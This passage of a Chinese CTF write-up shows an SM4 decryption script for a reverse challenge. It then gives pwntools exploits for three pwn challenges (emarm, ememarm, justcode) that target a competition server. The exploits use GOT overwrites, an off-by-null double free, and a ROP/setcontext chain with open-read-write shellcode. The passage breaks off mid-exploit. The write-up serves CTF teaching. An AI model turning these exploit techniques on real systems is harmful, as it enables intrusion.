class="string">'eb'</span>, <span class="string">'0f'</span>, <span class="string">'4b'</span>, <span class="string">'70'</span>, <span class="string">'56'</span>, <span class="string">'9d'</span>, <span class="string">'35'</span>,</span><br><span class="line">       <span class="string">'1e'</span>, <span class="string">'24'</span>, <span class="string">'0e'</span>, <span class="string">'5e'</span>, <span class="string">'63'</span>, <span class="string">'58'</span>, <span class="string">'d1'</span>, <span class="string">'a2'</span>, <span class="string">'25'</span>, <span class="string">'22'</span>, <span class="string">'7c'</span>, <span class="string">'3b'</span>, <span class="string">'01'</span>, <span class="string">'21'</span>, <span class="string">'78'</span>, <span class="string">'87'</span>,</span><br><span class="line">       <span class="string">'d4'</span>, <span class="string">'00'</span>, <span class="string">'46'</span>, <span class="string">'57'</span>, <span class="string">'9f'</span>, <span class="string">'d3'</span>, <span class="string">'27'</span>, <span class="string">'52'</span>, <span class="string">'4c'</span>, <span class="string">'36'</span>, <span class="string">'02'</span>, <span class="string">'e7'</span>, <span class="string">'a0'</span>, <span class="string">'c4'</span>, <span class="string">'c8'</span>, <span class="string">'9e'</span>,</span><br><span class="line">       <span class="string">'ea'</span>, <span class="string">'bf'</span>, <span class="string">'8a'</span>, <span class="string">'d2'</span>, <span class="string">'40'</span>, <span class="string">'c7'</span>, <span class="string">'38'</span>, <span class="string">'b5'</span>, <span class="string">'a3'</span>, <span class="string">'f7'</span>, <span class="string">'f2'</span>, <span class="string">'ce'</span>, <span class="string">'f9'</span>, <span class="string">'61'</span>, <span class="string">'15'</span>, <span class="string">'a1'</span>,</span><br><span class="line">       <span class="string">'e0'</span>, <span class="string">'ae'</span>, <span class="string">'5d'</span>, <span class="string">'a4'</span>, <span class="string">'9b'</span>, <span class="string">'34'</span>, <span class="string">'1a'</span>, <span class="string">'55'</span>, <span class="string">'ad'</span>, <span class="string">'93'</span>, <span class="string">'32'</span>, <span class="string">'30'</span>, <span class="string">'f5'</span>, <span class="string">'8c'</span>, <span class="string">'b1'</span>, <span class="string">'e3'</span>,</span><br><span class="line">       <span class="string">'1d'</span>, <span class="string">'f6'</span>, <span class="string">'e2'</span>, <span class="string">'2e'</span>, <span class="string">'82'</span>, <span class="string">'66'</span>, <span class="string">'ca'</span>, <span class="string">'60'</span>, <span class="string">'c0'</span>, <span class="string">'29'</span>, <span class="string">'23'</span>, <span class="string">'ab'</span>, <span class="string">'0d'</span>, <span class="string">'53'</span>, <span class="string">'4e'</span>, <span class="string">'6f'</span>,</span><br><span class="line">       <span class="string">'d5'</span>, <span class="string">'db'</span>, <span class="string">'37'</span>, <span class="string">'45'</span>, <span class="string">'de'</span>, <span class="string">'fd'</span>, <span class="string">'8e'</span>, <span class="string">'2f'</span>, <span class="string">'03'</span>, <span class="string">'ff'</span>, <span class="string">'6a'</span>, <span class="string">'72'</span>, <span class="string">'6d'</span>, <span class="string">'6c'</span>, <span class="string">'5b'</span>, <span class="string">'51'</span>,</span><br><span class="line">       <span class="string">'8d'</span>, <span class="string">'1b'</span>, <span class="string">'af'</span>, <span class="string">'92'</span>, <span class="string">'bb'</span>, <span class="string">'dd'</span>, <span class="string">'bc'</span>, <span class="string">'7f'</span>, <span class="string">'11'</span>, <span class="string">'d9'</span>, <span class="string">'5c'</span>, <span class="string">'41'</span>, <span class="string">'1f'</span>, <span class="string">'10'</span>, <span class="string">'5a'</span>, <span class="string">'d8'</span>,</span><br><span class="line">       <span class="string">'0a'</span>, <span class="string">'c1'</span>, <span class="string">'31'</span>, <span class="string">'88'</span>, <span class="string">'a5'</span>, <span class="string">'cd'</span>, <span class="string">'7b'</span>, <span class="string">'bd'</span>, <span class="string">'2d'</span>, <span class="string">'74'</span>, <span class="string">'d0'</span>, <span class="string">'12'</span>, <span class="string">'b8'</span>, <span class="string">'e5'</span>, <span class="string">'b4'</span>, <span class="string">'b0'</span>,</span><br><span class="line">       <span class="string">'89'</span>, <span class="string">'69'</span>, <span class="string">'97'</span>, <span class="string">'4a'</span>, <span class="string">'0c'</span>, <span class="string">'96'</span>, <span class="string">'77'</span>, <span class="string">'7e'</span>, <span class="string">'65'</span>, <span class="string">'b9'</span>, <span class="string">'f1'</span>, <span class="string">'09'</span>, <span class="string">'c5'</span>, <span class="string">'6e'</span>, <span class="string">'c6'</span>, <span class="string">'84'</span>,</span><br><span class="line">       <span class="string">'18'</span>, <span class="string">'f0'</span>, <span class="string">'7d'</span>, <span class="string">'ec'</span>, <span class="string">'3a'</span>, <span class="string">'dc'</span>, <span class="string">'4d'</span>, <span class="string">'20'</span>, <span class="string">'79'</span>, <span class="string">'ee'</span>, <span class="string">'5f'</span>, <span class="string">'3e'</span>, <span class="string">'d7'</span>, <span class="string">'cb'</span>, <span class="string">'39'</span>, <span class="string">'48'</span>,]</span><br><span class="line">FK = [<span class="string">'a3b1bac6'</span>, <span class="string">'56aa3350'</span>, <span class="string">'677d9197'</span>, <span class="string">'b27022dc'</span>]</span><br><span class="line">CK = [<span class="string">'00070e15'</span>, <span class="string">'1c232a31'</span>, <span class="string">'383f464d'</span>, <span class="string">'545b6269'</span>,</span><br><span class="line">      <span class="string">'70777e85'</span>, <span class="string">'8c939aa1'</span>, <span class="string">'a8afb6bd'</span>, <span class="string">'c4cbd2d9'</span>,</span><br><span class="line">      <span class="string">'e0e7eef5'</span>, <span class="string">'fc030a11'</span>, <span class="string">'181f262d'</span>, <span class="string">'343b4249'</span>,</span><br><span class="line">      <span class="string">'50575e65'</span>, <span class="string">'6c737a81'</span>, <span class="string">'888f969d'</span>, <span class="string">'a4abb2b9'</span>,</span><br><span class="line">      <span class="string">'c0c7ced5'</span>, <span class="string">'dce3eaf1'</span>, <span class="string">'f8ff060d'</span>, <span class="string">'141b2229'</span>,</span><br><span class="line">      <span class="string">'30373e45'</span>, <span class="string">'4c535a61'</span>, <span class="string">'686f767d'</span>, <span class="string">'848b9299'</span>,</span><br><span class="line">      <span class="string">'a0a7aeb5'</span>, <span class="string">'bcc3cad1'</span>, <span class="string">'d8dfe6ed'</span>, <span class="string">'f4fb0209'</span>,</span><br><span class="line">      <span class="string">'10171e25'</span>, <span class="string">'2c333a41'</span>, <span class="string">'484f565d'</span>, <span class="string">'646b7279'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">left</span><span class="params">(list,n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> list[n:] + list[:n]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">group</span><span class="params">(list, n)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(list), n):</span><br><span class="line">        <span class="keyword">yield</span> list[i:i + n]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    a1 = int(a,<span class="number">16</span>)</span><br><span class="line">    b1 = int(b,<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> a == b:</span><br><span class="line">        A = <span class="string">'&#123;:032x&#125;'</span>.format(int(a1^b1))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        A = <span class="string">'&#123;:08x&#125;'</span>.format(int(a1^b1))</span><br><span class="line">    <span class="keyword">return</span> A</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">round_function</span><span class="params">(k0,k1,k2,k3,rk,mod)</span>:</span></span><br><span class="line">    k = xor(xor(xor(k1,k2),k3),rk)</span><br><span class="line">    Tr = T(k,mod)</span><br><span class="line">    rki = xor(k0,Tr)</span><br><span class="line">    <span class="keyword">return</span> rki</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">T</span><span class="params">(A,mod)</span>:</span></span><br><span class="line">    T = linear(S(A),mod)</span><br><span class="line">    <span class="keyword">return</span> T</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">S</span><span class="params">(A)</span>:</span></span><br><span class="line">    A1 = []</span><br><span class="line">    A2 = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> group(A,<span class="number">2</span>):</span><br><span class="line">        A1.append(i)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        l = int(A1[i],<span class="number">16</span>)</span><br><span class="line">        A2[i] = <span class="string">'&#123;:02x&#125;'</span>.format(int(SBOX[l],<span class="number">16</span>)) </span><br><span class="line">    A2 = <span class="string">''</span>.join(A2)</span><br><span class="line">    <span class="keyword">return</span> A2</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">linear</span><span class="params">(B,mod)</span>:</span></span><br><span class="line">    B1 = list(B)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        B1[i] = <span class="string">'&#123;:04b&#125;'</span>.format(int(B1[i],<span class="number">16</span>))</span><br><span class="line">    B1 = <span class="string">''</span>.join(B1)</span><br><span class="line">    B1_2= left(B1,<span class="number">2</span>)</span><br><span class="line">    B1_10 = left(B1,<span class="number">10</span>)</span><br><span class="line">    B1_18 = left(B1,<span class="number">18</span>)</span><br><span class="line">    B1_24 = left(B1,<span class="number">24</span>)</span><br><span class="line">    B1_13 = left(B1,<span class="number">13</span>)</span><br><span class="line">    B1_23 = left(B1,<span class="number">23</span>)</span><br><span class="line">    <span class="keyword">if</span> mod == <span class="string">'enc'</span> <span class="keyword">or</span> mod ==  <span class="string">'dec'</span>:</span><br><span class="line">        BX = xor(xor(xor(xor(B1,B1_2),B1_10),B1_18),B1_24)</span><br><span class="line">    <span class="keyword">elif</span> mod == <span class="string">'extend'</span>:</span><br><span class="line">        BX = xor(xor(B1,B1_13),B1_23)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"模式输入错误"</span></span><br><span class="line">    BX = <span class="string">'%x'</span>%int(BX, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> BX</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_key</span><span class="params">(key)</span>:</span></span><br><span class="line">    MK = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> group(key,<span class="number">8</span>):</span><br><span class="line">        MK.append(i)</span><br><span class="line">    key0 = xor(MK[<span class="number">0</span>],FK[<span class="number">0</span>])</span><br><span class="line">    key1 = xor(MK[<span class="number">1</span>],FK[<span class="number">1</span>])</span><br><span class="line">    key2 = xor(MK[<span class="number">2</span>],FK[<span class="number">2</span>])</span><br><span class="line">    key3 = xor(MK[<span class="number">3</span>],FK[<span class="number">3</span>])</span><br><span class="line">    keylist = [key0,key1,key2,key3]</span><br><span class="line">    rk = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        a = round_function(keylist[i],keylist[i+<span class="number">1</span>],keylist[i+<span class="number">2</span>],keylist[i+<span class="number">3</span>],CK[i],mod=<span class="string">'extend'</span>)</span><br><span class="line">        keylist.append(a)</span><br><span class="line">        rk.append(a)</span><br><span class="line">    <span class="keyword">return</span> rk</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sm4_ecb</span><span class="params">(key,input_data,mod)</span>:</span></span><br><span class="line">    data = []</span><br><span class="line">    rk = get_key(key)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> group(input_data,<span class="number">8</span>):</span><br><span class="line">        data.append(i)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        <span class="keyword">if</span> mod == <span class="string">'enc'</span>:</span><br><span class="line">            ldata = round_function(data[i],data[i+<span class="number">1</span>],data[i+<span class="number">2</span>],data[i+<span class="number">3</span>],rk[i],mod)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ldata = round_function(data[i],data[i+<span class="number">1</span>],data[i+<span class="number">2</span>],data[i+<span class="number">3</span>],rk[<span class="number">31</span>-i],mod)</span><br><span class="line">        data.append(ldata)</span><br><span class="line">    out_data = [data[<span class="number">35</span>],data[<span class="number">34</span>],data[<span class="number">33</span>],data[<span class="number">32</span>]]</span><br><span class="line">    out_data = <span class="string">''</span>.join(out_data)</span><br><span class="line">    <span class="keyword">return</span> out_data</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sm4_cbc</span><span class="params">(key,input_data,iv,mod)</span>:</span></span><br><span class="line">    rk = get_key(key)</span><br><span class="line">    <span class="keyword">if</span> mod == <span class="string">'enc'</span>:</span><br><span class="line">        input_data = xor(input_data,iv)</span><br><span class="line">        data = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> group(input_data,<span class="number">8</span>):</span><br><span class="line">            data.append(i)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">            ldata = round_function(data[i],data[i+<span class="number">1</span>],data[i+<span class="number">2</span>],data[i+<span class="number">3</span>],rk[i],mod)</span><br><span class="line">            data.append(ldata)</span><br><span class="line">        out_data = [data[<span class="number">35</span>],data[<span class="number">34</span>],data[<span class="number">33</span>],data[<span class="number">32</span>]]</span><br><span class="line">        out_data = <span class="string">''</span>.join(out_data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> group(input_data,<span class="number">8</span>):</span><br><span class="line">            data.append(i)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">            ldata = round_function(data[i],data[i+<span class="number">1</span>],data[i+<span class="number">2</span>],data[i+<span class="number">3</span>],rk[<span class="number">31</span>-i],mod)</span><br><span class="line">            data.append(ldata)</span><br><span class="line">        out_data = [data[<span class="number">35</span>],data[<span class="number">34</span>],data[<span class="number">33</span>],data[<span class="number">32</span>]]</span><br><span class="line">        out_data = <span class="string">''</span>.join(out_data)</span><br><span class="line">        out_data = xor(out_data,iv)</span><br><span class="line">        out_data = <span class="string">'&#123;:032x&#125;'</span>.format(int(out_data, <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> out_data</span><br><span class="line"></span><br><span class="line">cipher_text=<span class="string">b"\xEA\x63\x58\xB7\x8C\xE2\xA1\xE9\xC5\x29\x8F\x53\xE8\x08\x32\x59\xAF\x1B\x67\xAE\xD9\xDA\xCF\xC4\x72\xFF\xB1\xEC\x76\x73\xF3\x06"</span></span><br><span class="line">key = <span class="string">"Ez_5M4_C1pH@r!!!"</span></span><br><span class="line">result=get_sm4_ecb(key = key.encode(<span class="string">'utf-8'</span>).hex(), input_data = cipher_text[:<span class="number">16</span>].hex(), mod = <span class="string">'dec'</span>)</span><br><span class="line">result=bytes.fromhex(result)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> result:</span><br><span class="line">	print(chr(x),end=<span class="string">""</span>)</span><br><span class="line">result=get_sm4_ecb(key = key.encode(<span class="string">'utf-8'</span>).hex(), input_data = cipher_text[<span class="number">16</span>:].hex(), mod = <span class="string">'dec'</span>)</span><br><span class="line">result=bytes.fromhex(result)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> result:</span><br><span class="line">	print(chr(x),end=<span class="string">""</span>)</span><br></pre></td></tr></table></figure>

<h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><h4 id="1-emarm"><a href="#1-emarm" class="headerlink" title="1.emarm"></a>1.emarm</h4><p>第一个检测发送一个0x00就可以绕过，然后允许我们输入一个地址，并更改其8字节的内容，由于没有开启FULL RELRO和PIE，直接改GOT表就好。由于ARM的libc基址没有随机化，我们可以先将atoi改为printf利用格式化字符串泄露出基址。然后重新打一次，这次将atoi改为system拿shell。</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x4000830000</span></span><br><span class="line">system_addr=libc_base+<span class="number">0x3F2C8</span></span><br><span class="line">sh=remote(<span class="string">'183.129.189.60'</span>,<span class="number">10012</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'passwd:'</span>,p8(<span class="number">0</span>))</span><br><span class="line"><span class="comment">#sh.send(str(0x000000000412020)+'\x00'+p64(0x0000000004008B0))#泄露基址</span></span><br><span class="line"><span class="comment">#sh.sendafter('bye','%9$p')</span></span><br><span class="line">sh.send(str(<span class="number">0x000000000412020</span>)+<span class="string">'\x00'</span>+p64(system_addr))</span><br><span class="line">sh.sendafter(<span class="string">'bye'</span>,<span class="string">'sh\x00'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="2-ememarm"><a href="#2-ememarm" class="headerlink" title="2.ememarm"></a>2.ememarm</h4><p>ARM的堆题，貌似没有什么检查，利用off by null可以实现double free，然后就可以任意地址写了，同样没有开启FULL RELRO和PIE，可以分配堆块到got表的puts处，这样可以避免堆块头破坏有用的函数，还可以更改掉free，而puts用类似的printf代替即可。由于double free只可进行一次，我们还是先利用格式化字符串泄露libc基址，然后打第二次调用system即可。</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(x,y,if_save)</span>:</span></span><br><span class="line">	sh.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line">	sh.sendafter(<span class="string">'cx:'</span>,x)</span><br><span class="line">	sh.sendafter(<span class="string">'cy:'</span>,y)</span><br><span class="line">	sh.sendlineafter(<span class="string">'?'</span>,str(if_save))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_40</span><span class="params">(x,y,if_save)</span>:</span></span><br><span class="line">	sh.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'4'</span>)</span><br><span class="line">	sh.sendafter(<span class="string">'cx:'</span>,x)</span><br><span class="line">	sh.sendafter(<span class="string">'cy:'</span>,y)</span><br><span class="line">	sh.sendlineafter(<span class="string">'?'</span>,str(if_save))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">	sh.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'3'</span>)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">	sh.send(content)</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x4000830000</span></span><br><span class="line">system_addr=libc_base+<span class="number">0x3F2C8</span></span><br><span class="line">sh=remote(<span class="string">"183.129.189.60"</span>,<span class="number">10034</span>)<span class="comment">#0x413260</span></span><br><span class="line">sh.send(<span class="string">'/bin/sh\x00'</span>.ljust(<span class="number">0x18</span>,<span class="string">'\x00'</span>))</span><br><span class="line">add_40(p64(<span class="number">0</span>),p64(<span class="number">0</span>),<span class="number">1</span>)</span><br><span class="line">add(<span class="string">'0'</span>,<span class="string">'0'</span>,<span class="number">1</span>)</span><br><span class="line">add_40(<span class="string">'0'</span>,<span class="string">'0'</span>,<span class="number">1</span>)</span><br><span class="line">add_40(<span class="string">'0'</span>,<span class="string">'0'</span>,<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">'a'</span>*<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'a'</span>*<span class="number">0x17</span>)</span><br><span class="line">add_40(p64(<span class="number">0x412030</span>),<span class="string">'0'</span>,<span class="number">0</span>)</span><br><span class="line"><span class="comment">#add_40('%15$p   ','%16$p',1)#3</span></span><br><span class="line">add_40(<span class="string">'/bin/sh\x00'</span>,<span class="string">'%16$p'</span>,<span class="number">1</span>)<span class="comment">#3</span></span><br><span class="line">add_40(p64(<span class="number">0x400780</span>),p64(system_addr),<span class="number">1</span>)<span class="comment">#4</span></span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0x400780</span>))</span><br><span class="line"><span class="comment">#libc_base=int(sh.recv(12)[2:],16)-0x206e0</span></span><br><span class="line"><span class="comment">#print(hex(libc_base))</span></span><br><span class="line"><span class="comment">#system_addr=libc_base+0x3F2C8</span></span><br><span class="line"><span class="comment">#add_40('/bin/sh\x00','/bin/sh\x00',1)#3</span></span><br><span class="line"><span class="comment">#add('0','0',1)#5</span></span><br><span class="line"><span class="comment">#edit(4,p64(0x400780)+p64(system_addr))</span></span><br><span class="line"><span class="comment">#edit(2,'a')</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="3-justcode"><a href="#3-justcode" class="headerlink" title="3.justcode"></a>3.justcode</h4><p>这道题开了沙箱。允许两个操作，一共执行4次。第一个往整个栈帧上写数据，并打印；第二个更改rbp-0x84处存储的地址上的4个字节，并向rbp-0x80读入0x6c个字节。</p>
<p>我们可以写用1操作在rbp-0x84处留下要改的地址，然后通过2操作来改，但这样总共只能改两次。所以我们可以将__stack_chk_fail改为main函数的地址，然后在1操作中改canary就可以实现任意次任意地址写4字节了，同时还能顺便泄露出rbp的地址，拿到栈地址。</p>
<p>考虑到1操作直接从rsp开始写数据，因此可以构造rop链，并将__stack_chk_fail改为0x400E9A来实现puts函数的调用泄露出libc地址。然后我们就可以把stack_chk_fail改成libc中的gadget了，一个比较合适的gadget是0x24374，它可以将设置rdi与下一个调用，我们将rax设置为setcontext，rdi设置为栈上构造的sigreturnframe，就可以进行orw操作了。</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://i.loli.net/2021/08/16/ePpMYFf18KRrHCc.png" alt="image-20210201162808892" title="">
                </div>
                <div class="image-caption">image-20210201162808892</div>
            </figure>

<p>然后就是读rop链到libc中的空白处，进行mprotect的调用将对应地址改为可执行，最后执行orw的shellcode即可。</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">	sub rsp, 0x800</span></span><br><span class="line"><span class="string">	push 0x67616c66</span></span><br><span class="line"><span class="string">	mov rdi, rsp</span></span><br><span class="line"><span class="string">	xor esi, esi</span></span><br><span class="line"><span class="string">	mov eax, 2</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	cmp eax, 0</span></span><br><span class="line"><span class="string">	js failed</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	mov edi, eax</span></span><br><span class="line"><span class="string">	mov rsi, rsp</span></span><br><span class="line"><span class="string">	mov edx, 0x100</span></span><br><span class="line"><span class="string">	xor eax, eax</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	mov edx, eax</span></span><br><span class="line"><span class="string">	mov rsi, rsp</span></span><br><span class="line"><span class="string">	mov edi, 1</span></span><br><span class="line"><span class="string">	mov eax, edi</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	jmp exit</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	failed:</span></span><br><span class="line"><span class="string">	push 0x6c696166</span></span><br><span class="line"><span class="string">	mov edi, 1</span></span><br><span class="line"><span class="string">	mov rsi, rsp</span></span><br><span class="line"><span class="string">	mov edx, 4</span></span><br><span class="line"><span class="string">	mov eax, edi</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	exit:</span></span><br><span class="line"><span class="string">	xor edi, edi</span></span><br><span class="line"><span class="string">	mov eax, 231</span></span><br><span class="line"><span class="string">	syscall'''</span></span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh=process('./justcode')#some gadgets 0x2BD59 0x24374</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sh=remote(<span class="string">'183.129.189.60'</span>,<span class="number">10041</span>)</span><br><span class="line">v7=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> v7:</span><br><span class="line">	sh.sendline(str(x))</span><br><span class="line">sh.sendafter(<span class="string">'name:'</span>,<span class="string">'a'</span>*<span class="number">0xc</span>+p64(<span class="number">0x602038</span>)+<span class="string">'a'</span>*<span class="number">0x74</span>)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">'id:'</span>,str(<span class="number">0x400D4B</span>))</span><br><span class="line">sh.sendafter(<span class="string">'info:'</span>,<span class="string">"a"</span>*<span class="number">0x4c</span>)</span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">'name:'</span>,<span class="string">'a'</span>*<span class="number">0x88</span>+<span class="string">'b'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'aaaab'</span>)</span><br><span class="line">sh.recv(<span class="number">7</span>)</span><br><span class="line">rbp=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x70</span><span class="number">-0x170</span></span><br><span class="line"></span><br><span class="line">v7=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> v7:</span><br><span class="line">	sh.sendline(str(x))</span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">'name:'</span>,<span class="string">'a'</span>*<span class="number">0xc</span>+p64(<span class="number">0x602038</span>)+<span class="string">'a'</span>*<span class="number">0x74</span>)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span 